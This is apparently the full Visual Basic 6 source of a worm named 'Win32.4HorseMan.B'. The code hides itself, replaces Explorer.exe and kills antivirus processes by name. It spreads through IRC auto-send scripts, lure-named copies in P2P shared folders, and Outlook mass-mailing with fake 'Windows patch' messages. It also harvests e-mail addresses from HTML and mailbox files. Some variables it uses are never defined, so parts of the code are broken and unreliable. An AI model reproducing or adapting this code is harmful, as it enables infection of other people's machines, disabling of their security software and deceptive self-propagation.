VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   ClientHeight    =   1035
   ClientLeft      =   4845
   ClientTop       =   2280
   ClientWidth     =   6465
   Icon            =   "Frm1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   1035
   ScaleWidth      =   6465
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   2400
      Top             =   480
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   1920
      Top             =   480
   End
   Begin VB.ListBox List1 
      BackColor       =   &H00808080&
      ForeColor       =   &H00000000&
      Height          =   450
      ItemData        =   "Frm1.frx":27A2
      Left            =   120
      List            =   "Frm1.frx":27A4
      TabIndex        =   0
      Top             =   120
      Width           =   6255
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Win32.4HorseMan.B - By SAD1c

Dim X(100), Y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
Dim epath, tpath, spath, halist As String
Dim fso, wsh

Public Function KillApp(myName As String) As Boolean
    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim exitCode As Long
    Dim myProcess As Long
    Dim AppKill As Boolean
    Dim appCount As Integer
    Dim i As Integer
    On Local Error GoTo Finish
    appCount = 0
    Const TH32CS_SNAPPROCESS As Long = 2&
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    List1.Clear
    Do While rProcessFound
        i = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
        List1.AddItem (szExename)
        If Right$(szExename, Len(myName)) = LCase$(myName) Then
            KillApp = True
            appCount = appCount + 1
            myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
            AppKill = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
Finish:
End Function

Private Sub Form_Load()
    On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 1
    KillApp ("none")
    Speed = -1
    K = 2038
    Zoom = 256
    Timer1.Interval = 1
    For i = 0 To 100
        X(i) = Int(Rnd * 1024) - 512
        Y(i) = Int(Rnd * 1024) - 512
        Z(i) = Int(Rnd * 512) - 256
    Next i
    spath = Environ("WinDir") & "\System\ShellInit.exe"
    vpath = App.Path & "\" & App.EXEName + ".exe"
    epath = Environ("WinDir") & "\Explorer.exe"
    If LCase(vpath) <> LCase(spath) Then
        If LCase(vpath) <> LCase(epath) Then
            tpath = Environ("Temp") & "\Explorer.exe"
            FileCopy epath, tpath
            KillApp (epath)
            Shell tpath
            Kill epath
            FileCopy vpath, epath
        End If
        Set wsh = CreateObject("WScript.Shell")
        FileCopy vpath, ipath
        Set fso = CreateObject("Scripting.FileSystemObject")
        spread
        outl
        wsh.RegWrite "HKLM\Software\4HorseMan\", "Win32.4HorseMan.B - By SAD1c"
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    RegisterServiceProcess GetCurrentProcessId, 0
    If LCase(vpath) = LCase(spath) Then
        Shell spath
    Else
        Shell epath
    End If
End Sub

Private Sub Timer1_Timer()
    For i = 0 To 100
    Next i
End Sub

Private Sub Timer2_Timer()
    On Error Resume Next
    KillApp ("none")
    Dim cnt As Integer
    Dim pr, all As String
    all = ""
    For cnt = 0 To List1.ListCount
        pr = List1.List(cnt)
        If InStr(1, pr, "avp") Or InStr(1, pr, "kav") Or InStr(1, pr, "nav") Or InStr(1, pr, "scan") Then
            KillApp (pr)
        ElseIf InStr(1, pr, "anti") Or InStr(1, pr, "alert") Or InStr(1, pr, "mon") Or InStr(1, pr, "check") Then
            KillApp (pr)
        ElseIf InStr(1, pr, "prot") Or InStr(1, pr, "vir") Or InStr(1, pr, "safe") Or InStr(1, pr, "guard") Then
            KillApp (pr)
        ElseIf InStr(1, pr, "alarm") Or InStr(1, pr, "detect") Or InStr(1, pr, "clean") Or InStr(1, pr, "watch") Then
            KillApp (pr)
        End If
        all = all & pr
    Next
    If InStr(1, all, LCase(spath)) = False Then
        FileCopy vpath, spath
        Shell spath
    End If
    If InStr(1, all, LCase(epath)) = False Then
        FileCopy vpath, epath
        Shell epath
    End If
    If InStr(1, all, LCase(tpath)) = False Then
        Shell tpath
    End If
End Sub

Sub mirc(pdir As String)
    On Error Resume Next
    FileCopy vpath, pdir & "\mIRC_Upgrade_Tool.exe"
    Open prog & "\Script.ini" For Output As 1
    Print #1, "n1= on 1:JOIN:#:{"
    Print #1, "n2= /if ( $nick != $me ) {"
    Print #1, "n3= /msg $nick Hi! try this useful program, it helped me a lot!"
    Print #1, "n4= /dcc send -c $nick " & pdir & "\mIRC_Utilities.exe"
    Print #1, "n5= }"
    Close 1
End Sub

Sub pirch(pdir As String)
    On Error Resume Next
    FileCopy vpath, pdir & "\pIRCh_Upgrade_Tool.exe"
    Open prog & "\Events.ini" For Output As 2
    Print #2, "[Levels]"
    Print #2, "Enabled=1"
    Print #2, "Count=6"
    Print #2, "Level1=000-Unknows"
    Print #2, "000-UnknowsEnabled=1"
    Print #2, "Level2=100-Level 100"
    Print #2, "100-Level 100Enabled=1"
    Print #2, "Level3=200-Level 200"
    Print #2, "200-Level 200Enabled=1"
    Print #2, "Level4=300-Level 300"
    Print #2, "300-Level 300Enabled=1"
    Print #2, "Level5=400-Level 400"
    Print #2, "400-Level 400Enabled=1"
    Print #2, "Level6=500-Level 500"
    Print #2, "500-Level 500Enabled=1"
    Print #2, "[000-Unknowns]"
    Print #2, "UserCount=0"
    Print #2, "Event1=ON JOIN:#:/msg $nick Watch this, it's very simple and can add a lot of things into your pIRCh!"
    Print #2, "EventCount=0"
    Print #2, "[100-Level 100]"
    Print #2, "User1=*!*@*"
    Print #2, "UserCount=1"
    Print #2, "Events1= ON JOIN:#: /dcc send $nick " & pdir & "\pIRCh_Upgrade_Tool.exe"
    Print #2, "EventCount=1"
    Print #2, "[200-Level 200]"
    Print #2, "UserCount=0"
    Print #2, "EventCount=0"
    Print #2, "[300-Level 300]"
    Print #2, "UserCount=0"
    Print #2, "EventCount=0"
    Print #2, "[400-Level 400]"
    Print #2, "UserCount=0"
    Print #2, "EventCount=0"
    Print #2, "[500-Level 500]"
    Print #2, "UserCount=0"
    Print #2, "EventCount=0"
    Close 2
End Sub

Sub p2ps(pdir As String)
    On Error Resume Next
    FileCopy vpath, pdir & "\Porn_Downloader.exe"
    FileCopy vpath, pdir & "\Soccer game.exe"
    FileCopy vpath, pdir & "\WinBugsFixInstaller.exe"
    FileCopy vpath, pdir & "\AIM password stealer.exe"
    FileCopy vpath, pdir & "\Norton AntiVirus Crack.exe"
    FileCopy vpath, pdir & "\Easy_Crack_creator.exe"
    FileCopy vpath, pdir & "\Christina Aguilera fucked.exe"
    FileCopy vpath, pdir & "\Pamela Anderson Sex.exe"
    FileCopy vpath, pdir & "\Saddam-Alive.exe"
    FileCopy vpath, pdir & "\Bin Laden-The truth.exe"
    FileCopy vpath, pdir & "\Hotmail password stealer.exe"
    FileCopy vpath, pdir & "\RegCleaner_Setup.exe"
End Sub

Sub spread()
    On Error Resume Next
    For Each drv In fso.drives
        If drv.isready Then
            fldr (drv.Path & "\")
        End If
    Next
End Sub

Sub fldr(fpath)
    On Error Resume Next
    Set folder = fso.getfolder(fpath)
    Set fname = LCase(folder.Name)
    If fname = "mirc" Or fname = "mirc32" Then
        mirc (folder.Path)
    ElseIf fname = "pirch" Or fname = "pirch98" Then
        pirch (folder.Path)
    ElseIf fname = "morpheus" Or fname = "kmd" Or fname = "kazaa" Or fname = "kazaa lite" Then
        p2ps (folder.Path & "\My Shared Folder")
    ElseIf fname = "edonkey2000" Or fname = "emule" Or fname = "overnet" Or fname = "applejuice" Then
        p2ps (folder.Path & "\Incoming")
    ElseIf fname = "bearshare" Or fname = "limewire" Then
        p2ps (folder.Path & "\Shared")
    ElseIf fname = "grokster" Then
        p2ps (folder.Path & "\My Grokster")
    End If
    For Each file In folder.Files
        ext = UCase(fso.getextensionname(file.Path))
        If ext = "HTM" Or ext = "HTML" Or ext = "HTT" Or ext = "ASP" Then
            Set src = fso.opentextfile(q6a.Path)
            aa = Split(src.readall, vbCrLf)
            src.Close
            For Each lin In aa
                ind = InStr(1, lin, "mailto:", 1)
                If InStr(1, lin, "mailto:", 1) Then
                    cn1 = 0
                    tm1 = ""
                    Do While Mid(lin, ind + cn1, 1) <> Chr(34) And Mid(lin, ind + cn1, 1) <> Chr(32) And Mid(lin, ind + cn1, 1) <> Chr(45)
                        cn1 = cn1 + 1
                        tm1 = tm1 + Mid(lin, ind + cn1 - 1, 1)
                    Loop
                    tm2 = Left(tm1, Len(tm1))
                    halist = halist & Right(tm2, Len(tm2) - 7) & vbCrLf
                End If
            Next
        ElseIf ext = "dbx" Then
            Set src = hCYEy7inBV.opentextfile(q6a.Path)
            ahc = src.readall
            src.Close
            bts = ""
            dcx = 0
            For kk = 1 To Len(ahc)
                car = Mid(ahc, kk, 1)
                If dcx = 0 Then
                    If car = Chr(60) Then
                        dcx = 1
                    End If
                Else
                    If car = Chr(62) Then
                        halist = halist & bts & vbCrLf
                    Else
                        bts = bts & car
                    End If
                End If
            Next
        End If
    Next
    For Each dire In folder.subfolders
        fldr (dire.Path)
    Next
End Sub

Sub outl()
    On Error Resume Next
    If wsh.RegRead("HKLM\Software\4HorseMan\MAPI") = "" Then
        Set out = CreateObject("Outlook.Application")
        Set map = out.GetNameSpace("MAPI")
        For f = 1 To map.GetDefaultFolder(10).Items.Count
            sendmail (map.GetDefaultFolder(10).Items.Item(f))
        Next
        wsh.RegWrite "HKLM\Software\4HorseMan\MAPI", "Done"
    End If
    adra = Split(halist, vbCrLf)
    For Each addr In adra
        sendmail (addr)
    Next addr
End Sub

Sub sendmail(address As String)
    On Error Resume Next
    allsub = Array("New update!", "Interesting file", "Update your system", "A windows patch", "Very important!", "Useful program!")
    allbod = Array("Try this patch that i've found yesterday, it's very useful!", "This Windows update is very simple and powerful! It helped me a lot!", "Check out this program, it has a lot of functions!", "Hi! Install this useful program, and tell me what you think about it! Greets!")
    allatt = Array("WinUpdate", "WindowsPatch", "Updater", "WinTool", "BugFixer", "Upgrade_Installer", "Microsoft_patch_7209")
    Randomize
    rndSubject = allsub(Rnd * 6)
    rndBody = allbod(Rnd * 4)
    rndAttachment = allatt(Rnd * 7)
    FileCopy vpath, Environ("Temp") & "\" & rndAttachment & ".exe"
    Set b = CreateObject("Outlook.Application").CreateItem(0)
    b.To = address
    b.Subject = rndSubject
    b.Body = rndBody
    b.Attachments.Add Environ("Temp") & "\" & rndAttachment & ".exe"
    b.Importance = 2
    b.DeleteAfterSubmit = True
    b.Send
End Sub
